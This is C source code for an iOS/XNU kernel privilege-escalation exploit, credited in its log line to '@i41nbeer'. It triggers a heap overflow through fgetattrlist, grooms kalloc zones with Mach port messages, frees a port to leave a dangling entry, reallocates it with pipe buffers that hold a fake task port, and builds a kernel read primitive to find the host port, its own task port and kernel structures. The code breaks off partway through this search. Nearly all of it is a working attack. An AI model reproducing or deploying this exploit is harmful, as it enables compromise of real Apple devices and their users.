#include <sys/resource.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>

#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <mach/mach.h>

#include "KernelMemory.h"
#include "KernelStructureOffsets.h"
#include "KernelUtilities.h"
#include "empty_list_sploit.h"
#include <common.h>

static void increase_limits()
{
    struct rlimit lim = { 0 };
    int err = getrlimit(RLIMIT_NOFILE, &lim);
    if (err != 0) {
        LOG("failed to get limits");
    }
    LOG("rlim.cur: %lld", lim.rlim_cur);
    LOG("rlim.max: %lld", lim.rlim_max);

    lim.rlim_cur = 10240;

    err = setrlimit(RLIMIT_NOFILE, &lim);
    if (err != 0) {
        LOG("failed to set limits");
    }

    lim.rlim_cur = 0;
    lim.rlim_max = 0;
    err = getrlimit(RLIMIT_NOFILE, &lim);
    if (err != 0) {
        LOG("failed to get limits");
    }
    LOG("rlim.cur: %lld", lim.rlim_cur);
    LOG("rlim.max: %lld", lim.rlim_max);
}

#define IO_BITS_ACTIVE 0x80000000
#define IKOT_TASK 2
#define IKOT_NONE 0

static void build_fake_task_port(uint8_t* fake_port, uint64_t fake_port_kaddr, uint64_t initial_read_addr, uint64_t vm_map, uint64_t receiver, uint64_t context)
{
    // clear the region we'll use:
    memset(fake_port, 0, 0x500);

    *(uint32_t*)(fake_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS)) = IO_BITS_ACTIVE | IKOT_TASK;
    *(uint32_t*)(fake_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES)) = 0xf00d; // leak references
    *(uint32_t*)(fake_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS)) = 0xf00d; // leak srights
    *(uint64_t*)(fake_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER)) = receiver;
    *(uint64_t*)(fake_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT)) = context;

    uint64_t fake_task_kaddr = fake_port_kaddr + 0x100;
    *(uint64_t*)(fake_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) = fake_task_kaddr;

    uint8_t* fake_task = fake_port + 0x100;

    // set the ref_count field of the fake task:
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references

    // make sure the task is active
    *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;

    // set the vm_map of the fake task:
    *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;

    // set the task lock type of the fake task's lock:
    *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;

    // set the bsd_info pointer to be 0x10 bytes before the desired initial read:
    *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO)) = initial_read_addr - 0x10;
}

#define N_EARLY_PORTS 80000
mach_port_t early_ports[N_EARLY_PORTS + 20000];
int next_early_port = 0;

void alloc_early_ports()
{
    for (int i = 0; i < N_EARLY_PORTS; i++) {
        kern_return_t err;
        err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &early_ports[i]);
        if (err != KERN_SUCCESS) {
            LOG("mach_port_allocate failed to allocate a new port for early_ports (%d)", i);
        }
    }
    next_early_port = N_EARLY_PORTS - 1;
}

mach_port_t steal_early_port()
{
    if (next_early_port == 0) {
        LOG("out of early ports");
        sleep(100);
    }
    mach_port_t p = early_ports[next_early_port];
    next_early_port--;
    //early_ports[next_early_port--] = MACH_PORT_NULL;
    return p;
}

void dump_early_ports()
{
    for (int i = 0; i < N_EARLY_PORTS; i++) {
        LOG("EARLY %d %08x", i, early_ports[i]);
    }
}

void clear_early_ports()
{
    for (int i = 0; i < next_early_port; i++) {
        mach_port_destroy(mach_task_self(), early_ports[i]);
    }
}

struct kalloc_16_send_msg {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
    uint8_t pad[0x200];
};

mach_port_t kalloc_16()
{
    kern_return_t err;
    // take an early port:
    mach_port_t port = steal_early_port();

    // insert a send right:
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);

    uint32_t msg_size = message_size_for_kalloc_size(0x110);
    // send a message with two OOL NULL ports; these will end up in a kalloc.16:
    struct kalloc_16_send_msg kalloc_msg = { 0 };

    kalloc_msg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    kalloc_msg.hdr.msgh_size = msg_size; //sizeof(struct kalloc_16_send_msg);
    kalloc_msg.hdr.msgh_remote_port = port;
    kalloc_msg.hdr.msgh_local_port = MACH_PORT_NULL;
    kalloc_msg.hdr.msgh_id = 0x41414141;

    kalloc_msg.body.msgh_descriptor_count = 1;

    mach_port_t ool_ports[2] = { 0xffffffff, 0xffffffff };

    kalloc_msg.ool_ports.address = ool_ports;
    kalloc_msg.ool_ports.count = 2;
    kalloc_msg.ool_ports.deallocate = 0;
    kalloc_msg.ool_ports.disposition = MACH_MSG_TYPE_COPY_SEND;
    kalloc_msg.ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    kalloc_msg.ool_ports.copy = MACH_MSG_PHYSICAL_COPY;

    // send it:
    err = mach_msg(&kalloc_msg.hdr,
        MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
        (mach_msg_size_t)msg_size, //sizeof(struct kalloc_16_send_msg),
        0,
        MACH_PORT_NULL,
        MACH_MSG_TIMEOUT_NONE,
        MACH_PORT_NULL);
    if (err != KERN_SUCCESS) {
        LOG("sending kalloc.16 message failed %s", mach_error_string(err));
    }

    return port;
}

#define N_MIDDLE_PORTS 50000
mach_port_t middle_ports[N_MIDDLE_PORTS];
int next_middle_port = 0;

mach_port_t alloc_middle_port()
{
    mach_port_t port;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND); // added
    if (err != KERN_SUCCESS) {
        LOG("failed to alloc middle port");
    }
    middle_ports[next_middle_port++] = port;
    return port;
}

struct ool_multi_msg {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports[0];
};

// to free them either receive the message or destroy the port
mach_port_t hold_kallocs(uint32_t kalloc_size, int allocs_per_message, int messages_to_send, mach_port_t holder_port, mach_port_t* source_ports)
{
    if (messages_to_send > MACH_PORT_QLIMIT_LARGE) {
        LOG("****************** too many messages");
        return MACH_PORT_NULL;
    }

    kern_return_t err;
    mach_port_t port = MACH_PORT_NULL;

    if (holder_port == MACH_PORT_NULL) {
        err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
        mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);

        if (err != KERN_SUCCESS) {
            LOG("failed to allocate port for hold kallocs");
        }

        // bump up the number of messages we can enqueue:
        mach_port_limits_t limits = { 0 };
        limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
        err = mach_port_set_attributes(mach_task_self(),
            port,
            MACH_PORT_LIMITS_INFO,
            (mach_port_info_t)&limits,
            MACH_PORT_LIMITS_INFO_COUNT);
        if (err != KERN_SUCCESS) {
            LOG("failed to increase queue limit");
            return false;
        }
    } else {
        port = holder_port;
    }

    // these are MACH_PORT_NULL
    mach_port_t* ports_to_send = calloc(kalloc_size / 8, sizeof(mach_port_name_t));

    size_t message_size = offsetof(struct ool_multi_msg, ool_ports[allocs_per_message + 1]);
    struct ool_multi_msg* msg = malloc(message_size);

    memset(msg, 0, message_size);

    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = (uint32_t)message_size;
    msg->hdr.msgh_remote_port = port;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0x12340101;

    msg->body.msgh_descriptor_count = allocs_per_message;

    for (int i = 0; i < allocs_per_message; i++) {
        msg->ool_ports[i].address = source_ports != NULL ? source_ports : ports_to_send;
        msg->ool_ports[i].count = kalloc_size / 8;
        msg->ool_ports[i].deallocate = 0;
        msg->ool_ports[i].disposition = MACH_MSG_TYPE_COPY_SEND;
        msg->ool_ports[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
        msg->ool_ports[i].copy = MACH_MSG_PHYSICAL_COPY;
    }

    for (int i = 0; i < messages_to_send; i++) {
        // send it:
        err = mach_msg(&msg->hdr,
            MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
            (uint32_t)message_size,
            0,
            MACH_PORT_NULL,
            MACH_MSG_TIMEOUT_NONE,
            MACH_PORT_NULL);
        if (err != KERN_SUCCESS) {
            LOG("%s", mach_error_string(err));
            //return false;
        }
    }
    free(ports_to_send);
    free(msg);

    return port;
}

uint8_t msg_buf[10000];
void discard_message(mach_port_t port)
{
    mach_msg_header_t* msg = (mach_msg_header_t*)msg_buf;
    kern_return_t err;
    err = mach_msg(msg,
        MACH_RCV_MSG | MACH_MSG_TIMEOUT_NONE, // no timeout
        0,
        10000,
        port,
        0,
        0);
    if (err != KERN_SUCCESS) {
        LOG("error receiving on port: %s", mach_error_string(err));
    }

    mach_msg_destroy(msg);
}

#include <sys/attr.h>

int vfs_fd = -1;
struct attrlist al = { 0 };
size_t attrBufSize = 16;
void* attrBuf = NULL;

void prepare_vfs_overflow()
{
    vfs_fd = open("/", O_RDONLY);
    if (vfs_fd == -1) {
        perror("unable to open fs root\n");
        return;
    }

    al.bitmapcount = ATTR_BIT_MAP_COUNT;
    al.volattr = 0xfff;
    al.commonattr = ATTR_CMN_RETURNED_ATTRS;

    attrBuf = malloc(attrBufSize);
}

// this will do a kalloc.16, overflow out of it with 8 NULL bytes, then free it
void do_vfs_overflow()
{
    int options = 0;
    int err = fgetattrlist(vfs_fd, &al, attrBuf, attrBufSize, options);
    //LOG("err: %d", err);
}

mach_port_t initial_early_kallocs[80000];
int next_early_kalloc = 0;

mach_port_t middle_kallocs[80000];
int next_middle_kalloc = 0;

// in the end I don't use these, but maybe they help?

volatile int keep_spinning = 1;
void* spinner(void* arg)
{
    while (keep_spinning)
        ;
    return NULL;
}

#define N_SPINNERS 100
pthread_t spin_threads[N_SPINNERS];

void start_spinners()
{
    return;
    for (int i = 0; i < N_SPINNERS; i++) {
        pthread_create(&spin_threads[i], NULL, spinner, NULL);
    }
}

void stop_spinners()
{
    return;
    keep_spinning = 0;
    for (int i = 0; i < N_SPINNERS; i++) {
        pthread_join(spin_threads[i], NULL);
    }
}

const int total_fds = 14 * 0x1f * 8;
int read_ends[total_fds];
int write_ends[total_fds];
int next_pipe_index = 0;

static mach_port_t early_read_port = MACH_PORT_NULL;
int early_read_read_fd = -1;
int early_read_write_fd = -1;
uint64_t early_read_known_kaddr = 0;

// read_fd and write_fd are the pipe fds which have a pipe buffer at known_addr
static void prepare_early_read_primitive(mach_port_t target_port, int read_fd, int write_fd, uint64_t known_kaddr)
{
    early_read_port = target_port;
    early_read_read_fd = read_fd;
    early_read_write_fd = write_fd;
    early_read_known_kaddr = known_kaddr;
}

uint32_t early_rk32(uint64_t kaddr)
{
    uint8_t* buf = malloc(0xfff);
    read(early_read_read_fd, buf, 0xfff);
    build_fake_task_port(buf, early_read_known_kaddr, kaddr, 0, 0, 0);
    write(early_read_write_fd, buf, 0xfff);

    uint32_t val = 0;
    kern_return_t err = pid_for_task(early_read_port, &val);
    if (err != KERN_SUCCESS) {
        LOG("pid_for_task returned %x (%s)", err, mach_error_string(err));
    }
    LOG("read val via pid_for_task: %08x", val);
    free(buf);
    return val;
}

uint64_t early_rk64(uint64_t kaddr)
{
    uint64_t lower = (uint64_t)early_rk32(kaddr);
    uint64_t upper = (uint64_t)early_rk32(kaddr + 4);
    uint64_t final = lower | (upper << 32);
    return final;
}

void waitFor(int seconds) {
    for (int i = 0; i <= seconds; i++) {
        LOG("Waiting (%d/%d)", i, seconds);
        sleep(1);
    }
}

bool vfs_sploit()
{
    LOG("empty_list by @i41nbeer");
    offsets_init();

    start_spinners();
    LOG("vfs_sploit");
    increase_limits();

    size_t kernel_page_size = 0;
    host_page_size(mach_host_self(), &kernel_page_size);
    if (kernel_page_size == 0x4000) {
        LOG("this device uses 16k kernel pages");
        // waitFor(20);
    } else if (kernel_page_size == 0x1000) {
        LOG("this device uses 4k kernel pages");
        // waitFor(45);
    } else {
        LOG("this device uses an unsupported kernel page size");
        return false;
    }

    prepare_vfs_overflow();
    // set up the heap:

    // allocate a pool of early ports; we'll use some of these later
    alloc_early_ports();

    if (kernel_page_size == 0x1000) {
        mach_port_t initial_kallocs_holder = hold_kallocs(0x10, 100, 100, MACH_PORT_NULL, NULL);
    }

    // 0x110 will be the kalloc size of the ipc_kmsg allocation for the kalloc.16 messages
    // we need to ensure that these allocations don't interfere with the page-level groom,
    // so ensure there's a long freelist for them

    // make 30'000 kalloc(0x110) calls then free them all
    mach_port_t flp = hold_kallocs(0x110, 100, 500, MACH_PORT_NULL, NULL);
    mach_port_destroy(mach_task_self(), flp);

    // try to groom our initial pattern:
    //   kalloc.16 | ipc_ports | kalloc.16 | ipc_ports ...
    // first off we're just trying to get the pages like that

    int INITIAL_PATTERN_REPEATS = kernel_page_size == 0x4000 ? 40 : 60;
    mach_port_t kalloc_holder_port = MACH_PORT_NULL;

    int kallocs_per_zcram = kernel_page_size / 0x10; // 0x1000 with small kernel pages, 0x4000 with large
    int ports_per_zcram = kernel_page_size == 0x1000 ? 0x49 : 0x61; // 0x3000 with small kernel pages, 0x4000 with large

    for (int i = 0; i < INITIAL_PATTERN_REPEATS; i++) {
        // 1 page of kalloc
        for (int i = 0; i < kallocs_per_zcram; i++) {
            mach_port_t p = kalloc_16();
            initial_early_kallocs[next_early_kalloc++] = p;
        }

        // 1 full allocation set of ports:
        for (int i = 0; i < ports_per_zcram; i++) {
            mach_port_t port = alloc_middle_port();
        }
    }

    // now we hopefully have a nice arrangement of repeated fresh 'k.16 | ipc_port' pages
    // to understand this next bit it's important to notice that zone allocations will come first
    // from intermediate (partially full) pages. This means that if we just start free'ing and
    // allocating k.16 objects somewhere in the middle of the groom they won't be re-used until
    // the current intermediate page is either full or empty.

    // this provides a challenge because fresh page's freelist's are filled semi-randomly such that
    // their allocations will go from the inside to the outside:
    //
    //   | 9 8 6 5 2 1 3 4 7 10 | <-- example "randomized" allocation order from a fresh all-free page
    //
    // this means that our final intermediate k.16 and ports pages will look a bit like this:
    //
    //   | - - - 5 2 1 3 4 - - | - - - 4 1 2 3 5 - - |
    //           kalloc.16             ipc_ports

    // if we use the overflow to corrupt a freelist entry we'll panic if it gets allocated, so we
    // need to avoid that

    // the trick is that by controlling the allocation and free order we can reverse the freelists such that
    // the final intermediate pages will look more like this:
    //
    //  | 1 4 - - - - - 5 3 2 | 2 5 - - - - - 4 3 1 |
    //          kalloc.16               ipc_ports
    //
    // at this point we're much more likely to be able to free a kalloc.16 and realloc it for the overflow
    // such that we can hit the first qword of an ipc_port

    // free them all, reversing the freelists!
    for (int i = 0; i < next_early_kalloc; i++) {
        discard_message(initial_early_kallocs[i]);
    }

    int HOP_BACK = kernel_page_size == 0x4000 ? 16 : 30;

    for (int i = 0; i < INITIAL_PATTERN_REPEATS - HOP_BACK; i++) {
        for (int i = 0; i < kallocs_per_zcram; i++) {
            mach_port_t p = kalloc_16();
            middle_kallocs[next_middle_kalloc++] = p;
        }
    }

    mach_port_t target_port = MACH_PORT_NULL;

    int first_candidate_port_index = next_middle_port - ((HOP_BACK + 2) * ports_per_zcram); // 32 35  +2
    int last_candidate_port_index = next_middle_port - ((HOP_BACK - 2) * ports_per_zcram); // 28 25  -2

    //sched_yield();
    // wait a second
    // this is a load-bearing sleep - this works better than sched_yield
    // we want this loop to be as fast as possible, and ideally not get pre-empted
    // don't remove this :)
    sleep(1);
    for (int i = 0; i < kallocs_per_zcram; i++) {
        mach_port_t kp = middle_kallocs[next_middle_kalloc - 20 - 1];
        next_middle_kalloc--;

        discard_message(kp);

        do_vfs_overflow();

        // realloc
        mach_port_t replacer_f = kalloc_16();

        // loop through the candidate overwrite target ports and see if they were hit
        // we can detect this via mach_port_kobject; if we know the name we pass it is valid
        // but we get KERN_INVALID_RIGHT then we cleared the io_active bit

        for (int j = first_candidate_port_index; j < last_candidate_port_index; j++) {
            mach_port_t candidate_port = middle_ports[j];
            kern_return_t err;
            natural_t typep = 0;
            mach_vm_address_t addr = 0;

            err = mach_port_kobject(mach_task_self(),
                candidate_port,
                &typep,
                &addr);
            if (err != KERN_SUCCESS) {
                LOG("found the port! %x", candidate_port);
                target_port = candidate_port;
                break;
            }
        }
        if (target_port != MACH_PORT_NULL) {
            break;
        }
    }

    stop_spinners();

    // lets stash the ports we want to keep:

    // we know the dangling port is about 30 loops back from the end of the middle_ports
    // lets keep hold of a region about 3 loop iterations ahead of this

#define CANARY_REGION 4

    int ports_to_hold = ports_per_zcram; //ports_per_zcram * 3;//0x49*3;
    mach_port_t hold_ports[ports_to_hold];
    for (int i = 0; i < ports_to_hold; i++) {
        int source_index = ((INITIAL_PATTERN_REPEATS - HOP_BACK + CANARY_REGION) * ports_per_zcram) + i; // 20  10
        hold_ports[i] = middle_ports[source_index];
        middle_ports[source_index] = MACH_PORT_NULL;
    }

    // now dump all our ports
    // we can keep the early ports, we'll continue to use them for kallocs and stuff

    for (int i = 0; i < next_middle_port; i++) {
        mach_port_t port = middle_ports[i];
        if (port == MACH_PORT_NULL) {
            continue;
        }
        if (port == target_port) {
            // cause the target port to be freed but leave us a dangling entry in the port table
            // note that the port isn't active so we need a code path which will take and drop a reference
            // but won't do anything if the port isn't active (like trying to give us a DEAD_NAME)
            int new_size = 100;
            kern_return_t err = mach_port_set_attributes(mach_task_self(), target_port, MACH_PORT_DNREQUESTS_SIZE, (mach_port_info_t)&new_size, sizeof(int));
            if (err != KERN_SUCCESS) {
                LOG("mach_port_set_attributes failed %s", mach_error_string(err));
            } else {
                LOG("freed the port");
            }
        } else {
            mach_port_destroy(mach_task_self(), port);
        }
    }

    // 150MB
#define N_COLLECTABLES 3
    mach_port_t collectable_ports[N_COLLECTABLES];
    for (int i = 0; i < N_COLLECTABLES; i++) {
        collectable_ports[i] = hold_kallocs(0x800, 0x3e, 400, MACH_PORT_NULL, NULL);
    }

    for (int i = 0; i < N_COLLECTABLES; i++) {
        mach_port_destroy(mach_task_self(), collectable_ports[i]);
    }

    // choose a port from the middle of the holder range as our canary:
    mach_port_t canary_port = hold_ports[ports_to_hold / 2];
    mach_port_insert_right(mach_task_self(), canary_port, canary_port, MACH_MSG_TYPE_MAKE_SEND);

    // now try to cause the GC by allocating many copies of the replacer object:
    // the goal is to get the canary port overlapping the ip_context field of the dangling port
    mach_port_t replacer_object[0x200] = { 0 };
    replacer_object[koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT) / 8] = canary_port;

    // the replacer object allocation is a 0x1000 alloc
    // using the same maths as above lets allocate 200 MB of them,
    // slowly, hoping to cause GC:
    int n_gc_ports = 200;
    // int n_gc_ports = 250; // 200
    mach_port_t gc_ports[n_gc_ports];
    for (int i = 0; i < n_gc_ports; i++) {
        gc_ports[i] = hold_kallocs(0x1000, 0x1f, 8, MACH_PORT_NULL, replacer_object);
        LOG("gc tick %d", i);
        pthread_yield_np();
        usleep(10000);
    }
    LOG("did that trigger a gc and realloc?");

    // if that worked we should now be able to find the address of the canary port:
    uint64_t canary_port_kaddr = 0;
    kern_return_t err;
    err = mach_port_get_context(mach_task_self(), target_port, &canary_port_kaddr);
    if (err != KERN_SUCCESS) {
        LOG("error getting context from the target port (but no panic...): %s", mach_error_string(err));
    }

    LOG("the canary port is at %016llx", canary_port_kaddr);

    // lets modify the port so we can detect when we receive the message which has the OOL_PORTS descriptor which
    // overlaps the dangling target port:

    // we should be a bit more careful doing this to not go off the end:
    uint64_t fake_canary_kport_addr = canary_port_kaddr + 0xa8;

    err = mach_port_set_context(mach_task_self(), target_port, fake_canary_kport_addr);

    // lets build the contents of the pipe buffer
    // we're gonna hope that we can get this allocated pretty near the canary port:
    size_t pipe_buffer_size = 0xfff; // this is for kalloc.4096
    uint8_t* pipe_buf = malloc(0x1000);
    memset(pipe_buf, 0, 0x1000);

    uint64_t pipe_target_kaddr_offset = kernel_page_size == 0x4000 ? 0x20000 : 0x10000;

    uint64_t pipe_target_kaddr = (canary_port_kaddr + pipe_target_kaddr_offset) & (~0xfffULL); // 0x10000
    LOG("pipe_target_kaddr: %016llx", pipe_target_kaddr);

    build_fake_task_port(pipe_buf, pipe_target_kaddr, pipe_target_kaddr, 0, 0, 0);

    // now go through each of the hold_kalloc messages and receive them.
    // check if they contained the canary port
    // reallocate them

    mach_port_t secondary_leaker_ports[200] = { 0 };

    struct {
        mach_msg_header_t hdr;
        mach_msg_body_t body;
        mach_msg_ool_ports_descriptor_t ool_ports[0x1f];
        mach_msg_trailer_t trailer;
        char pad[1000];
    } msg = { 0 };

    LOG("sizeof(msg) 0x%x", sizeof(msg));

    int hit_dangler = 0;
    int dangler_hits = 0;
    LOG("the canary port is: %x", canary_port);

    mach_port_t fake_canary_port = MACH_PORT_NULL;

    for (int i = 0; i < n_gc_ports; i++) {
        mach_port_t gc_port = gc_ports[i];

        for (int j = 0; j < 8; j++) {
            err = mach_msg(&msg.hdr,
                MACH_RCV_MSG,
                0,
                sizeof(msg),
                gc_port,
                0,
                0);
            if (err != KERN_SUCCESS) {
                LOG("failed to receive OOL_PORTS message (%d,%d) %s", i, j, mach_error_string(err));
            }

            // check each of the canary ports:
            for (int k = 0; k < 0x1f; k++) {
                mach_port_t* ool_ports = msg.ool_ports[k].address;
                mach_port_t tester_port = ool_ports[koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT) / 8];
                if (tester_port != canary_port) {
                    LOG("found the mis-matching OOL discriptor (%x)", tester_port);
                    hit_dangler = 1;
                    fake_canary_port = tester_port;
                } else {
                    // drop the UREF
                    mach_port_deallocate(mach_task_self(), tester_port);
                }
            }
        }

        if (!hit_dangler) {
            // if we haven't yet hit the dangler, try to reallocate this memory:
            secondary_leaker_ports[i] = hold_kallocs(0x1000, 0x1f, 8, MACH_PORT_NULL, NULL);
        } else {
            if (dangler_hits == 14) {
                // we'll run out of pipe kva so stop now
                LOG("hopefully that's enough pipes");
                break;
            }
            for (int i = 0; i < (0x1f * 8); i++) {
                // we have hit the dangler; from now on out we'll realloc with pipes
                // pipe memory is limited
                int fds[2] = { 0 };
                int err = pipe(fds);
                if (err != 0) {
                    perror("pipe failed\n");
                }

                int read_end = fds[0];
                int write_end = fds[1];

                int flags = fcntl(write_end, F_GETFL);
                flags |= O_NONBLOCK;
                fcntl(write_end, F_SETFL, flags);

                build_fake_task_port(pipe_buf, pipe_target_kaddr, pipe_target_kaddr, 0, 0, next_pipe_index);

                ssize_t amount_written = write(write_end, pipe_buf, 0xfff);
                if (amount_written != 0xfff) {
                    LOG("amount written was short: 0x%x", amount_written);
                }

                read_ends[next_pipe_index] = read_end;
                write_ends[next_pipe_index++] = write_end;
            }
            dangler_hits++;
        }
    }

    LOG("replaced with pipes hopefully... take a look");

    // check the kernel object type of the dangling port:
    int otype = 0;
    mach_vm_address_t oaddr = 0;
    err = mach_port_kobject(mach_task_self(), target_port, &otype, &oaddr);
    if (err != KERN_SUCCESS) {
        LOG("mach_port_kobject failed: %x %s", err, mach_error_string(err));
    }
    LOG("dangling port type: %x", otype);

    uint64_t replacer_pipe_index = 0xfffffff;
    err = mach_port_get_context(mach_task_self(), target_port, &replacer_pipe_index);
    LOG("got replaced with pipe fd index %d", replacer_pipe_index);

    LOG("gonna try a read...");

    uint32_t val = 0;
    err = pid_for_task(target_port, &val);
    if (err != KERN_SUCCESS) {
        LOG("pid_for_task returned %x (%s)", err, mach_error_string(err));
    }
    LOG("read val via pid_for_task: %08x", val);

    // at this point we know:
    //  * which pipe fd overlaps with the dangling port
    //  * the kernel address of the canary port (which is still a dangling port)
    //  * the kernel address of the fake task (which is a pipe buffer, but we don't know which one)

    // things will be easier if we can learn the address of the dangling port giving us the address of the pipe buffer and a what/where primitive
    // we could hack around that by always rewriting all the pipes each time I guess...

    // for each pipe, apart from the one which we know overlaps with the port, replace the field which determines where to read from, then do the kernel read and see if the value is no longer 0x80000002
    char* old_contents = malloc(0xfff);
    char* new_contents = malloc(0xfff);
    int pipe_target_kaddr_replacer_index = -1;
    for (int i = 0; i < next_pipe_index; i++) {
        if (i == replacer_pipe_index) {
            continue;
        }
        read(read_ends[i], old_contents, 0xfff);
        build_fake_task_port(new_contents, pipe_target_kaddr, pipe_target_kaddr + 4, 0, 0, 0);
        write(write_ends[i], new_contents, 0xfff);

        // try the read, did it change?
        uint32_t val = 0;
        err = pid_for_task(target_port, &val);
        if (err != KERN_SUCCESS) {
            LOG("pid_for_task returned %x (%s)", err, mach_error_string(err));
        }
        LOG("read val via pid_for_task: %08x", val);
        if (val != 0x80000002) {
            LOG("replacer fd index %d is at the pipe_target_kaddr", i);
            pipe_target_kaddr_replacer_index = i;
            break;
        }
    }
    free(old_contents);
    free(new_contents);
    if (pipe_target_kaddr_replacer_index == -1) {
        LOG("failed to find the pipe_target_kaddr_replacer pipe");
    }

    // now we know which pipe fd matches up with where the fake task is so
    // bootstrap the early read primitives

    prepare_early_read_primitive(target_port, read_ends[pipe_target_kaddr_replacer_index], write_ends[pipe_target_kaddr_replacer_index], pipe_target_kaddr);

    // we can now use early_rk{32,64}

    // send a message to the canary port containing a send right to the host port;
    // use the arbitrary read to find that, and from there find the kernel task port

    mach_msg_header_t host_msg = { 0 };
    host_msg.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, MACH_MSG_TYPE_COPY_SEND);
    host_msg.msgh_size = sizeof(host_msg);
    host_msg.msgh_remote_port = canary_port;
    host_msg.msgh_local_port = mach_host_self();
    host_msg.msgh_id = 0x12344321;

    err = mach_msg(&host_msg,
        MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
        sizeof(host_msg),
        0,
        MACH_PORT_NULL,
        MACH_MSG_TIMEOUT_NONE,
        MACH_PORT_NULL);
    if (err != KERN_SUCCESS) {
        LOG("failed to send host message to canary port %s", mach_error_string(err));
        //return false;
    }
    LOG("sent host_msg to canary port, let's find it and locate the host port");

    uint64_t host_kmsg = early_rk64(canary_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE));
    LOG("host_kmsg: %016llx", host_kmsg);

    // hexdump the kmsg:
    //for (int i = 0; i < 100; i++) {
    //  uint64_t val = early_rk64(host_kmsg + (i*8));
    //  LOG("%016llx: %016llx", host_kmsg + (i*8), val);
    //}
    uint64_t host_port_kaddr = early_rk64(host_kmsg + 0xac); // could parse the message to find this rather than hardcode

    // do the same thing again to get our task port:
    discard_message(canary_port);

    host_msg.msgh_local_port = mach_task_self();
    err = mach_msg(&host_msg,
        MACH_SEND_MSG | MACH_MSG_OPTION_NONE,
        sizeof(host_msg),
        0,
        MACH_PORT_NULL,
        MACH_MSG_TIMEOUT_NONE,
        MACH_PORT_NULL);
    if (err != KERN_SUCCESS) {
        LOG("failed to send host message to canary port %s", mach_error_string(err));
        //return false;
    }
    LOG("sent task_msg to canary port, let's find it and locate the host port");

    uint64_t task_kmsg = early_rk64(canary_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE));
    LOG("task_kmsg: %016llx", task_kmsg);

    uint64_t task_port_kaddr = cached_task_self_addr = early_rk64(host_kmsg + 0xac);

    LOG("our task port is at %016llx", task_port_kaddr);

    // now we can copy-paste some code from multi_path:
    // for the full read/write primitive we need to find the kernel vm_map and the kernel ipc_space
    // we can get the ipc_space easily from the host port (receiver field):
    uint64_t ipc_space_kernel = early_rk64(host_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));

    LOG("ipc_space_kernel: %016llx", ipc_space_kernel);

    // the kernel vm_map is a little trickier to find
    // we can use the trick from mach_portal to find the kernel task port because we know it's gonna be near the host_port on the heap:

    // find the start of the zone block containing the host and kernel task pointers:

    uint64_t offset = host_port_kaddr & 0xfff;
    uint64_t first_port = 0;
    if ((offset % 0xa8) == 0) {
        LOG("host port is on first page");
        first_port = host_port_kaddr & ~(0xfff);
    } else if (((offset + 0x1000) % 0xa8) == 0) {
        LOG("host port is on second page");
        first_port = (host_port_kaddr - 0x1000) & ~(0xfff);
    } else if (((offset + 0x2000) % 0xa8) == 0) {
        LOG("host port is on second page");
        first_port = (host_port_kaddr - 0x2000) & ~(0xfff);
    } else {
        LOG("hummm, my assumptions about port allocations are wrong...");
    }

    LOG("first port is at %016llx", first_port);
    uint64_t kernel_vm_map = 0;
    for (int i = 0; i < ports_per_zcram; i++) {
        uint64_t early_port_kaddr = first_port + (i * 0xa8);
        uint32_t io_bits = early_rk32(early_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS));

        if (io_bits != (IO_BITS_ACTIVE | IKOT_TASK)) {
            continue;
        }

        // get that port's kobject:
        uint64_t task_t = early_rk64(early_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
        if (task_t == 0) {
            LOG("weird heap object with NULL kobject");
            continue;
        }

        // check the pid via the bsd_info:
        uint64_t bsd_info = early_rk64(task_t + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        if (bsd_info == 0) {
            LOG("task doesn't have a bsd info");
